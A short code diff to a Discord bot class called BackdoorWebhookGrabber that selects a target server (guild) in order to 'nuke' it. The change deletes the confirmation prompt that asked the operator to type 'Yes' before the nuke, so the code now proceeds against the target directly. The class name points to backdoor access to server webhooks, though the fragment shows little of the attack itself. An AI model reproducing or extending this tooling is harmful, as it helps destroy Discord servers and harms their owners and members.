@@ -42,16 +42,7 @@ class BackdoorWebhookGrabber(chattrigger.ChatTrigger):
                 await message.channel.send("Couldn't find guild!")
                 return await get_target_guild()
 
-            try:
-                await message.channel.send(
-                    f"Are you sure you want to nuke {str(target_guild_)} by {str(target_guild_.owner)}?\n"
-                    f"Respond with 'Yes' (Case Sensitive) to continue.")
-            except AttributeError:
-                await message.channel.send(
-                    f"Are you sure you want to nuke {str(target_guild_)} by Unknown Owner?\n"
-                    f"Respond with 'Yes' (Case Sensitive) to continue.")
-
-                return target_guild_
+            return target_guild_
 
         target_guild = await get_target_guild()
         # get_target_guild returns None when an exit condition is reached
